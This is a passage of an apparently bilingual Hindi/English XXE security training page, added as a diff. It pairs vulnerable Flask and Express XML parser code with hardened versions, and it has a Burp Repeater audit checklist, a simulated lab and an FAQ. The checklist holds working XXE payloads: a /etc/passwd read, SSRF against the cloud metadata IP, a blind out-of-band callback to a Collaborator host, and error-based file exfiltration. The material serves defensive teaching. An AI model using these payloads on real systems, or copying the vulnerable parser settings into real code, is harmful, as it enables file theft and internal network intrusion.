+          <div class="content-sub-h3">1. Python Flask Defense: defusedxml vs lxml Hardening</div>
+          <div class="code-comparison-grid">
+            <!-- Vulnerable Python -->
+            <div class="code-col-card vulnerable">
+              <div class="code-card-header">
+                <span class="code-header-badge vulnerable">Vulnerable Code</span>
+                <span class="code-lang-label">Python (Flask / lxml)</span>
+              </div>
+              <pre class="code-block-body">from flask import Flask, request, jsonify
+from lxml import etree
+
+app = Flask(__name__)
+
+@app.route('/api/v1/xml/order', methods=['POST'])
+def process_order():
+    xml_data = request.data
+    
+    # ❌ VULNERABLE: lxml resolves external entities
+    # and permits network/file DTD expansion by default
+    parser = etree.XMLParser(resolve_entities=True)
+    root = etree.fromstring(xml_data, parser=parser)
+    
+    item = root.find('item').text
+    return jsonify({"status": "processed", "item": item})</pre>
+              <div class="code-explanation-foot">
+                ❌ <code>resolve_entities=True</code> enables the parser to resolve <code>SYSTEM "file:///etc/passwd"</code> and leak files in the HTTP response.
+              </div>
+            </div>
+
+            <!-- Secure Python -->
+            <div class="code-col-card secure">
+              <div class="code-card-header">
+                <span class="code-header-badge secure">Secure Remediation</span>
+                <span class="code-lang-label">Python (Flask / defusedxml)</span>
+              </div>
+              <pre class="code-block-body">from flask import Flask, request, jsonify
+import defusedxml.ElementTree as DefusedET
+from defusedxml.common import DefusedXmlException
+
+app = Flask(__name__)
+
+@app.route('/api/v1/xml/order', methods=['POST'])
+def process_order():
+    xml_data = request.data
+    try:
+        # ✅ SECURE: defusedxml blocks all entity expansion,
+        # external DTDs, and Billion Laughs recursion
+        root = DefusedET.fromstring(xml_data)
+        
+        item = root.find('item').text
+        return jsonify({"status": "processed", "item": item})
+        
+    except DefusedXmlException as e:
+        return jsonify({"error": "Forbidden XML Entity Detected"}), 400</pre>
+              <div class="code-explanation-foot">
+                ✅ <code>defusedxml</code> overrides the core parser to immediately reject any DTD entity references, preventing both XXE and XML Bomb DoS.
+              </div>
+            </div>
+          </div>
+
+          <!-- Node.js Express Implementation -->
+          <div class="content-sub-h3" style="margin-top:2rem;">2. Node.js Express Defense: fast-xml-parser &amp; libxmljs</div>
+          <div class="code-comparison-grid">
+            <!-- Vulnerable Node.js -->
+            <div class="code-col-card vulnerable">
+              <div class="code-card-header">
+                <span class="code-header-badge vulnerable">Vulnerable Code</span>
+                <span class="code-lang-label">Node.js (Express / libxmljs)</span>
+              </div>
+              <pre class="code-block-body">const express = require('express');
+const libxmljs = require('libxmljs');
+const app = express();
+
+app.use(express.text({ type: 'application/xml' }));
+
+app.post('/api/v1/xml/order', (req, res) => {
+  // ❌ VULNERABLE: noent: true instructs libxmljs to
+  // substitute and resolve external entities!
+  const xmlDoc = libxmljs.parseXml(req.body, {
+    noent: true,   // Replaces entities with values!
+    dtdload: true  // Fetches external DTDs!
+  });
+  
+  const item = xmlDoc.get('//item').text();
+  res.json({ status: 'processed', item });
+});</pre>
+              <div class="code-explanation-foot">
+                ❌ Setting <code>noent: true</code> and <code>dtdload: true</code> enables full external file evaluation and SSRF.
+              </div>
+            </div>
+
+            <!-- Secure Node.js -->
+            <div class="code-col-card secure">
+              <div class="code-card-header">
+                <span class="code-header-badge secure">Secure Remediation</span>
+                <span class="code-lang-label">Node.js (Express / fast-xml-parser)</span>
+              </div>
+              <pre class="code-block-body">const express = require('express');
+const { XMLParser } = require('fast-xml-parser');
+const app = express();
+
+app.use(express.text({ type: 'application/xml' }));
+
+// ✅ SECURE: fast-xml-parser does not resolve external entities
+// and ignores DTD entity declarations by default
+const safeParser = new XMLParser({
+  ignoreAttributes: false,
+  processEntities: false,  // Prevents entity evaluation
+  stopNodes: ["*.dtd"]
+});
+
+app.post('/api/v1/xml/order', (req, res) => {
+  try {
+    const parsedObj = safeParser.parse(req.body);
+    const item = parsedObj.order?.item || 'Unknown';
+    res.json({ status: 'processed', item });
+  } catch (err) {
+    res.status(400).json({ error: 'Invalid XML payload' });
+  }
+});</pre>
+              <div class="code-explanation-foot">
+                ✅ <code>processEntities: false</code> in <code>fast-xml-parser</code> safely suppresses entity resolution and ignores remote DTD fetch requests.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 5: REVIEW CHECKLIST (Exact Module 07 Parity - Burp Repeater Exclusively)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-checklist">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">5</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">Hands-On API XXE Pentesting Checklist</span>
+              <span class="lang-en">Hands-On API XXE Pentesting Checklist</span>
+            </h2>
+          </div>
+
+          <div class="checklist-meta-header">
+            <div class="checklist-guide-msg">
+              <span class="lang-hi">Har test case ko inspect karein aur <strong>Pass (Secure)</strong> ya <strong>Fail (Vulnerable)</strong> mark karein:</span>
+              <span class="lang-en">Audit each test case and mark as <strong>Pass (Secure)</strong> or <strong>Fail (Vulnerable)</strong>:</span>
+            </div>
+            <div class="checklist-counter-badge">
+              <span id="checklist-progress-counter">0 of 7 Checks Audited (0 Passed | 0 Vulnerable)</span>
+            </div>
+          </div>
+
+          <div class="checklist-container">
+            <!-- Item 1 -->
+            <div class="checklist-item" id="check-item-1" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">1</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">1. Content-Type Header Tampering (JSON to XML Conversion Audit)</span>
+                  <span class="lang-en">1. Content-Type Header Tampering (JSON to XML Conversion Audit)</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Verify karein ki kya JSON-accepting API endpoints ko <code>Content-Type: application/xml</code> bhej kar XML parse karne ke liye force kiya ja sakta hai.</span>
+                  <span class="lang-en">Verify whether JSON endpoints can be coerced into XML parsing by switching the <code>Content-Type</code> header.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <span class="lang-hi">1. Original JSON request ko Burp Repeater me bhejein.<br>2. Header change karein: <code>Content-Type: application/xml</code>.<br>3. Body ko XML format me convert karein aur check karein:</span>
+                  <span class="lang-en">1. Send a standard JSON request to Burp Repeater.<br>2. Modify header: <code>Content-Type: application/xml</code>.<br>3. Convert JSON body to XML:</span>
+                  <div class="check-burp-block">
+POST /api/v1/users/profile HTTP/1.1
+Host: api.target.com
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe "HELLO_XXE_AUDIT"&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</div>
+                  <span class="lang-hi">Agar response me <code>HELLO_XXE_AUDIT</code> reflect ho jata hai, toh endpoint XML parsing support karta hai aur vulnerable hai!</span>
+                  <span class="lang-en">If the response reflects <code>HELLO_XXE_AUDIT</code>, the backend accepts XML and evaluates entity substitutions!</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 2 -->
+            <div class="checklist-item" id="check-item-2" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">2</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">2. Classical Local File Disclosure (/etc/passwd &amp; win.ini)</span>
+                  <span class="lang-en">2. Classical Local File Disclosure (/etc/passwd &amp; win.ini)</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Test karein ki kya direct <code>SYSTEM "file:///..."</code> external entity se server ke sensitive system files read ho rahe hain.</span>
+                  <span class="lang-en">Test whether direct <code>SYSTEM "file:///..."</code> entities disclose local filesystem files.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <span class="lang-hi">1. Request body me Linux ke liye <code>file:///etc/passwd</code> ya Windows ke liye <code>file:///c:/windows/win.ini</code> inject karein:</span>
+                  <span class="lang-en">1. In Burp Repeater, inject the file disclosure entity:</span>
+                  <div class="check-burp-block">
+POST /api/v1/invoice/validate HTTP/1.1
+Host: api.target.com
+Content-Type: application/xml
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE doc [
+  &lt;!ENTITY disclose SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;doc&gt;&lt;note&gt;&amp;disclose;&lt;/note&gt;&lt;/doc&gt;</div>
+                  <span class="lang-hi">Agar response me <code>root:x:0:0</code> ka text milta hai, toh ye <strong>CRITICAL FAIL</strong> hai!</span>
+                  <span class="lang-en">If the response yields <code>root:x:0:0</code>, mark as <strong>CRITICAL FAIL</strong>.</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 3 -->
+            <div class="checklist-item" id="check-item-3" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">3</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">3. Cloud Metadata SSRF via XML Entity Resolution</span>
+                  <span class="lang-en">3. Cloud Metadata SSRF via XML Entity Resolution</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Test karein ki kya XML parser cloud providers (AWS, GCP, Azure) ke internal link-local IP metadata endpoints ko query karta hai.</span>
+                  <span class="lang-en">Verify whether the parser permits HTTP/HTTPS external entities targeting internal cloud metadata IP addresses.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <div class="check-burp-block">
+POST /api/v1/xml/parse HTTP/1.1
+Host: api.target.com
+Content-Type: application/xml
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/hostname"&gt;
+]&gt;
+&lt;data&gt;&lt;info&gt;&amp;ssrf;&lt;/info&gt;&lt;/data&gt;</div>
+                  <span class="lang-hi">Agar EC2 instance ID ya internal hostname return hota hai, toh cloud credentials compromise ho sakte hain!</span>
+                  <span class="lang-en">If an AWS instance ID or internal hostname is reflected, mark as <strong>CRITICAL FAIL</strong>.</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 4 -->
+            <div class="checklist-item" id="check-item-4" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">4</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">4. Blind Out-Of-Band (OOB) Interaction with Burp Collaborator</span>
+                  <span class="lang-en">4. Blind Out-Of-Band (OOB) Interaction with Burp Collaborator</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Check karein ki jab endpoint response suppress karta hai, tab kya parser external server par outgoing DNS/HTTP query initiate karta hai.</span>
+                  <span class="lang-en">Determine whether blind endpoints trigger external DNS lookup or HTTP callbacks to attacker-controlled domains.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <span class="lang-hi">1. Burp Collaborator se ek unique payload domain copy karein.<br>2. Burp Repeater me ye payload send karein:</span>
+                  <span class="lang-en">1. Generate a Burp Collaborator payload URL.<br>2. Send the following in Burp Repeater:</span>
+                  <div class="check-burp-block">
+POST /api/v1/orders/xml HTTP/1.1
+Host: api.target.com
+Content-Type: application/xml
+
+&lt;!DOCTYPE test [
+  &lt;!ENTITY % oob SYSTEM "http://COLLABORATOR-SUBDOMAIN.burpcollaborator.net"&gt;
+  %oob;
+]&gt;
+&lt;order&gt;&lt;id&gt;1&lt;/id&gt;&lt;/order&gt;</div>
+                  <span class="lang-hi">Agar Burp Collaborator tab me DNS ya HTTP ping receive hota hai, toh backend blind XXE ke liye vulnerable hai!</span>
+                  <span class="lang-en">If DNS queries or HTTP requests appear in the Collaborator tab, the parser permits Out-Of-Band interaction!</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 5 -->
+            <div class="checklist-item" id="check-item-5" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">5</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">5. XML File Upload Formats (SVG, DOCX, XLSX Entity Auditing)</span>
+                  <span class="lang-en">5. XML File Upload Formats (SVG, DOCX, XLSX Entity Auditing)</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Test karein ki kya avatar upload ya document upload features (SVG image, Microsoft Office XML files) me embedded XXE payloads parse ho rahe hain.</span>
+                  <span class="lang-en">Test whether file upload endpoints parsing SVG images or OpenXML documents (DOCX, XLSX) evaluate entity directives.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <div class="check-burp-block">
+POST /api/v1/user/avatar HTTP/1.1
+Host: api.target.com
+Content-Type: image/svg+xml
+
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text font-size="16" x="0" y="20"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</div>
+                  <span class="lang-hi">Agar uploaded image render hote hi server ka hostname image me text ban kar dikhta hai, toh ye <strong>CRITICAL FAIL</strong> hai!</span>
+                  <span class="lang-en">If the rendered avatar renders the server hostname as visible text, mark as <strong>CRITICAL FAIL</strong>.</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 6 -->
+            <div class="checklist-item" id="check-item-6" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">6</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">6. Error-Based XXE Exfiltration via Invalid URI DTDs</span>
+                  <span class="lang-en">6. Error-Based XXE Exfiltration via Invalid URI DTDs</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Check karein ki kya parser error stack traces me sensitive file contents leak karta hai jab invalid non-existent file entity declare ki jati hai.</span>
+                  <span class="lang-en">Determine whether verbose parser error outputs dump file contents when referencing an intentionally invalid file URI.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 How to Test in Burp Suite Repeater:</div>
+                  <div class="check-burp-block">
+POST /api/v1/xml/order HTTP/1.1
+Host: api.target.com
+Content-Type: application/xml
+
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+  &lt;!ENTITY % eval "&lt;!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+  %eval;
+  %error;
+]&gt;
+&lt;foo&gt;bar&lt;/foo&gt;</div>
+                  <span class="lang-hi">Agar HTTP 500 error response me <code>file:///nonexistent/127.0.0.1 localhost...</code> dikhta hai, toh error-based XXE confirmed hai!</span>
+                  <span class="lang-en">If the 500 error message leaks <code>FileNotFound: /nonexistent/127.0.0.1 localhost...</code>, mark as <strong>CRITICAL FAIL</strong>.</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Item 7 -->
+            <div class="checklist-item" id="check-item-7" onclick="handleCheckItemClick(event, this)">
+              <div class="check-box-circle" onclick="toggleCheckCircle(event, this)" title="Click to toggle Pass / Fail">
+                <span class="check-mark-icon">7</span>
+              </div>
+              <div class="check-content">
+                <h5>
+                  <span class="lang-hi">7. Source Code Parser Configuration Audit (DTD Disablement)</span>
+                  <span class="lang-en">7. Source Code Parser Configuration Audit (DTD Disablement)</span>
+                </h5>
+                <p>
+                  <span class="lang-hi">Source code review me check karein ki kya XML parsing library (Python defusedxml, Java setFeature, Node fast-xml-parser) secure configuration flags use kar rahi hai.</span>
+                  <span class="lang-en">Review application source code to confirm that external entity resolution and DTDs are explicitly disabled in parser instantiations.</span>
+                </p>
+                <div class="check-how-to-box">
+                  <div class="check-how-to-title">🔍 Verification Standard:</div>
+                  <span class="lang-hi">Python: Code me <code>defusedxml</code> import hona chahiye, ya <code>etree.XMLParser(resolve_entities=False, no_network=True)</code> pass hona chahiye.<br>Node.js: <code>libxmljs</code> me <code>noent: false</code> hona chahiye, ya <code>fast-xml-parser</code> use hona chahiye. Agar default standard <code>xml.etree</code> use ho raha hai, toh <strong>FAIL</strong>!</span>
+                  <span class="lang-en">Python: Code must leverage <code>defusedxml</code> or pass <code>resolve_entities=False, no_network=True</code>.<br>Node.js: Code must configure <code>noent: false</code> or utilize <code>fast-xml-parser</code>. Unhardened standard parsers constitute a <strong>FAIL</strong>.</span>
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">
+                    <span>✓</span> <span>Pass (Secure)</span>
+                  </button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">
+                    <span>✕</span> <span>Fail (Vulnerable)</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 6: LIVE LAB (Interactive XML Injection Playground)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-lab">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">6</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">Interactive XXE Injection Simulator Lab</span>
+              <span class="lang-en">Interactive XXE Injection Simulator Lab</span>
+            </h2>
+          </div>
+
+          <p>
+            <span class="lang-hi">Neeche diye gaye interactive sandbox me alag-alag XML payloads test karein. Aap check kar sakte hain ki ek <strong>Vulnerable Parser (Entities Enabled)</strong> aur ek <strong>Hardened Parser (defusedxml)</strong> me request evaluate hone par kya result aata hai:</span>
+            <span class="lang-en">Test malicious and safe XML payloads in the live interactive sandbox below. Contrast how an <strong>Unhardened Parser (Entities Allowed)</strong> behaves compared to a <strong>Defused Parser (Hardened)</strong>:</span>
+          </p>
+
+          <div class="lab-container-grid">
+            <!-- Left: XML Editor -->
+            <div class="lab-editor-card">
+              <div class="lab-editor-header">
+                <span style="font-size:0.8rem; font-weight:700; color:#38bdf8;">XML Request Editor</span>
+                <select class="lab-preset-selector" id="labPresetSelect" onchange="loadLabPreset(this.value)">
+                  <option value="safe">Preset 1: Normal Order XML</option>
+                  <option value="passwd" selected>Preset 2: /etc/passwd Local File Read</option>
+                  <option value="aws">Preset 3: AWS IMDSv1 Cloud SSRF</option>
+                  <option value="oob">Preset 4: Blind OOB Collaborator Ping</option>
+                  <option value="bomb">Preset 5: Billion Laughs DoS Bomb</option>
+                </select>
+              </div>
+              <textarea class="lab-xml-input" id="labXmlInput" spellcheck="false"></textarea>
+              <div class="lab-actions-bar">
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <label style="font-size:0.75rem; color:#94a3b8; display:flex; align-items:center; gap:4px; cursor:pointer;">
+                    <input type="checkbox" id="labParserToggle">
+                    <span>Enable <code>defusedxml</code> Protection</span>
+                  </label>
+                </div>
+                <button type="button" class="btn-parse-trigger" onclick="runLabSimulation()">
+                  <span>⚡ Send XML Request</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Right: Simulated Terminal Output -->
+            <div class="lab-editor-card">
+              <div class="lab-editor-header">
+                <span style="font-size:0.8rem; font-weight:700; color:#94a3b8;">Simulated Server Response</span>
+                <span id="labStatusBadge" style="font-family:var(--font-mono); font-size:0.75rem; color:#f87171; font-weight:700;">HTTP 200 OK</span>
+              </div>
+              <div class="lab-output-terminal" id="labOutputTerminal"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 7: FAQ (Comprehensive Production Engineering & Interview Q&A)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-questions">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">7</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">Frequently Asked Questions (XXE Production Engineering)</span>
+              <span class="lang-en">Frequently Asked Questions (XXE Production Engineering)</span>
+            </h2>
+          </div>
+
+          <div class="faq-accordion-group">
+            <!-- Q1 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q1: Agar hamari API sirf JSON support karti hai, toh kya hum XXE se 100% safe hain?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Hamesha nahi! Agar aapka web framework (jaise Spring Boot, Rails, ya customized Express middleware) request ke <code>Content-Type: application/xml</code> header ko dekh kar automatically XML deserializer ko call kar deta hai, toh attacker JSON endpoint par XML payload bhej kar XXE trigger kar sakta hai. Isliye Content-Type strict whitelisting zaroori hai.
+              </div>
+            </div>
+
+            <!-- Q2 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q2: XXE aur SSRF me kya sambandh hai? Kya har XXE ek SSRF hota hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                XXE ek broad vulnerability category hai jo file reading, SSRF, aur DoS teenon cause kar sakti hai. Jab ek XML entity me URI scheme <code>http://</code> ya <code>https://</code> use ki jati hai (jaise <code>&lt;!ENTITY ssrf SYSTEM "http://169.254.169.254"&gt;</code>), toh parser backend server se internal network request fire karta hai—ye XXE-induced SSRF ban jata hai.
+              </div>
+            </div>
+
+            <!-- Q3 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q3: Parameter Entity (<code>%</code>) aur General Entity (<code>&amp;</code>) me kya antar hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                General entities document body ke andar <code>&amp;name;</code> ke zariye reference hoti hain. Lekin parameter entities sirf DTD subset ke andar <code>%name;</code> ke roop me use hoti hain. Parameter entities external DTDs include karne aur dynamic nesting karne ke kaam aati hain, jo Blind XXE OOB exfiltration ke liye essential vector hain.
+              </div>
+            </div>
+
+            <!-- Q4 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q4: Python ke standard <code>xml.etree.ElementTree</code> me XXE kaise behave karta hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Python 3.8+ me standard <code>xml.etree.ElementTree</code> external general entities ko default roop se resolve nahi karta, lekin ye Billion Laughs DoS (exponential entity expansion) aur local entity expansion se fully protected nahi hota. Isliye production applications me hamesha <code>defusedxml</code> use karne ki recommendation di jati hai.
+              </div>
+            </div>
+
+            <!-- Q5 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q5: Kya WAF (Web Application Firewall) XXE ko effectively block kar sakta hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                WAFs par puri tarah rely nahi kiya ja sakta kyunki XML encoding tricks (UTF-16, UTF-32, EBCDIC encoding) se WAF signature bypass ho jata hai jabki backend parser multi-byte encoding ko decode karke attack execute kar deta hai. Real fix hamesha parser level par DTD ko disable karna hai.
+              </div>
+            </div>
+
+            <!-- Q6 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q6: Excel (XLSX) aur Word (DOCX) files me XXE kaise chhipa hota hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Office Open XML formats (.docx, .xlsx, .pptx) asal me ZIP archives hote hain jinke andar multiple XML files (jaise <code>[Content_Types].xml</code>, <code>word/document.xml</code>) hoti hain. Attacker file ko unzip karta hai, XML me DTD entity daalta hai, aur re-zip karke upload kar deta hai. Agar server unzipping ke baad safe parser use nahi karta, toh XXE trigger ho jata hai.
+              </div>
+            </div>
+
+            <!-- Q7 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q7: Blind XXE me PHP <code>expect://</code> wrapper ka kya role hota hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Agar PHP environment me <code>expect</code> PECL extension loaded hai, toh attacker <code>SYSTEM "expect://id"</code> likhkar seedha Remote Code Execution (RCE) achieve kar sakta hai. Halanki modern PHP me expect extension default me disabled hoti hai.
+              </div>
+            </div>
+
+            <!-- Q8 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q8: Java Spring Boot applications me XXE prevent karne ke liye standard snippet kya hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Java <code>DocumentBuilderFactory</code> me DTD completely disable karne ke liye: <code>dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</code> set karein. Is feature ke active hote hi koi bhi document DTD include karne par turant reject ho jata hai.
+              </div>
+            </div>
+
+            <!-- Q9 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q9: SOAP Web Services me XXE attack kaise execute hota hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                SOAP protocol XML based hota hai. Attacker SOAP envelope ke upar <code>&lt;!DOCTYPE soapenv:Envelope [...]&gt;</code> block daal kar body ke kisi parameter me entity call kar deta hai. Agar SOAP engine DTD processing allow karta hai, toh internal service data leak ho jata hai.
+              </div>
+            </div>
+
+            <!-- Q10 -->
+            <div class="faq-item">
+              <div class="faq-question" onclick="toggleFaq(this)">
+                <span>Q10: Billion Laughs Attack ko mitigate karne ke liye memory limit ka kya solution hai?</span>
+                <span class="faq-icon">▼</span>
+              </div>
+              <div class="faq-answer">
+                Parsers me entity expansion limit set ki jati hai (jaise Java me <code>XMLConstants.FEATURE_SECURE_PROCESSING</code> ya Python me <code>defusedxml</code> ka recursion depth counter), jo ek threshold se zyada entity expansion ko instantly terminate kar deta hai.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+
+  <script src="assets/js/main.js"></script>
+
+  <script>
+    // Module 11 Page-Specific Inline Script
+    document.addEventListener('DOMContentLoaded', () => {
+      // 1. Language Toggle Synchronization
+      const langToggle = document.getElementById('langToggle');
+      const lblHi = document.getElementById('lbl-hi');
+      const lblEn = document.getElementById('lbl-en');
+
+      if (langToggle) {
+        langToggle.addEventListener('change', () => {
+          const isEnglish = langToggle.checked;
+          document.documentElement.setAttribute('data-lang', isEnglish ? 'en' : 'hi');
+          lblHi.classList.toggle('active', !isEnglish);
+          lblEn.classList.toggle('active', isEnglish);
+        });
+      }
+
+      // 2. Underline Tab Navigation
+      const tabBtns = document.querySelectorAll('.tab-underline-btn');
+      const tabContents = document.querySelectorAll('.tab-content');
+
+      tabBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+          tabBtns.forEach(b => b.classList.remove('active'));
+          tabContents.forEach(c => c.classList.remove('active'));
+
+          btn.classList.add('active');
+          const targetId = btn.getAttribute('data-tab');
+          const targetContent = document.getElementById(targetId);
+          if (targetContent) {
+            targetContent.classList.add('active');
+          }
+        });
+      });
+
+      // 3. Hero Attack Simulator Toggle Logic
+      const btnNormal = document.getElementById('btnXxeNormal');
+      const btnExploit = document.getElementById('btnXxeExploit');
+      const avatar = document.getElementById('xxeAttackerAvatar');
+      const label = document.getElementById('xxeAttackerLabel');
+      const sub = document.getElementById('xxeAttackerSub');
